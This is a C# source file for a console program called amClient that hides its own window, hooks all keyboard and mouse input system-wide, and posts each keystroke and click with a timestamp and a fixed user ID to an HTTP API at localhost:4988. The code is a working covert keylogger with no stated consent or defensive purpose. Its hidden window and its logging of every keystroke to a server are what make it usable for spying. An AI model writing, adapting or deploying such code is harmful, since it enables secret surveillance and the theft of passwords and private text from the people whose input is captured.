﻿using Gma.System.MouseKeyHook;
using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace amClient
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static IKeyboardMouseEvents m_Events;

        public static void Main()
        {
            //Console.Title = "Testing";
            Console.Title = "amMiddle Start";

            IntPtr hWnd = FindWindow(null, "amMiddle Start");

            if (hWnd != IntPtr.Zero)
            {
                //Hide the window
                ShowWindow(hWnd, 0); // 0 = SW_HIDE
            }

            //API
            RunAsync().Wait();

            SubscribeGlobal();

            Application.Run();
        }

        private static void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private static void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;
            //m_Events.KeyDown += OnKeyDown;
            //m_Events.KeyUp += OnKeyUp;
            m_Events.KeyPress += HookManager_KeyPress;

            //m_Events.MouseUp += OnMouseUp;
            m_Events.MouseClick += OnMouseClick;
            //m_Events.MouseDoubleClick += OnMouseDoubleClick;

            //m_Events.MouseMove += HookManager_MouseMove;

            //m_Events.MouseDragStarted += OnMouseDragStarted;
            //m_Events.MouseDragFinished += OnMouseDragFinished;

            //if (checkBoxSupressMouseWheel.Checked)
            //    m_Events.MouseWheelExt += HookManager_MouseWheelExt;
            //else
            //    m_Events.MouseWheel += HookManager_MouseWheel;

            //if (checkBoxSuppressMouse.Checked)
            //    m_Events.MouseDownExt += HookManager_Supress;
            //else
            //    m_Events.MouseDown += OnMouseDown;
        }

        private static void Unsubscribe()
        {
            if (m_Events == null) return;
            //m_Events.KeyDown -= OnKeyDown;
            //m_Events.KeyUp -= OnKeyUp;
            m_Events.KeyPress -= HookManager_KeyPress;

            //m_Events.MouseUp -= OnMouseUp;
            m_Events.MouseClick -= OnMouseClick;
            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;

            //m_Events.MouseMove -= HookManager_MouseMove;

            //m_Events.MouseDragStarted -= OnMouseDragStarted;
            //m_Events.MouseDragFinished -= OnMouseDragFinished;

            //if (checkBoxSupressMouseWheel.Checked)
            //    m_Events.MouseWheelExt -= HookManager_MouseWheelExt;
            //else
            //    m_Events.MouseWheel -= HookManager_MouseWheel;

            //if (checkBoxSuppressMouse.Checked)
            //    m_Events.MouseDownExt -= HookManager_Supress;
            //else
            //    m_Events.MouseDown -= OnMouseDown;

            m_Events.Dispose();
            m_Events = null;
        }

        private static void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            //Log(string.Format("KeyPress \t\t {0}\n", e.KeyChar));

            var monitor = new amModel();
            monitor.amModelId = Guid.NewGuid().ToString();
            monitor.KeyLogCatch = e.KeyChar.ToString();
            monitor.InputType = "Keyboard";
            monitor.TimeStamp = DateTime.Now;
            monitor.userID = "HWK";

            CreateMonitoringAsync(monitor);
        }

        private static void OnMouseClick(object sender, MouseEventArgs e)
        {
            //Log(string.Format("MouseClick \t\t {0}\n", e.Button));

            var monitor = new amModel();
            monitor.amModelId = Guid.NewGuid().ToString();
            monitor.KeyLogCatch = e.Button.ToString();
            monitor.InputType = "Mouse";
            monitor.TimeStamp = DateTime.Now;
            monitor.userID = "HWK";

            CreateMonitoringAsync(monitor);
        }

        private static void Log(string text)
        {
            //if (IsDisposed) return;
            //textBoxLog.AppendText(text);
            //textBoxLog.ScrollToCaret();
        }
        
        static HttpClient client = new HttpClient();

        static async Task RunAsync()
        {
            // New code:
            client.BaseAddress = new Uri("http://localhost:4988");
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
        }

        static async Task<amModel> GetMonitoringModelSampleData(string path)
        {
            amModel monitor = null;
            HttpResponseMessage response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                monitor = await response.Content.ReadAsAsync<amModel>();
            }
            return monitor;
        }

        static async Task<Uri> CreateMonitoringAsync(amModel monitor)
        {
            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController", monitor);
            response.EnsureSuccessStatusCode();

            // Return the URI of the created resource.
            return response.Headers.Location;
        }
    }
}
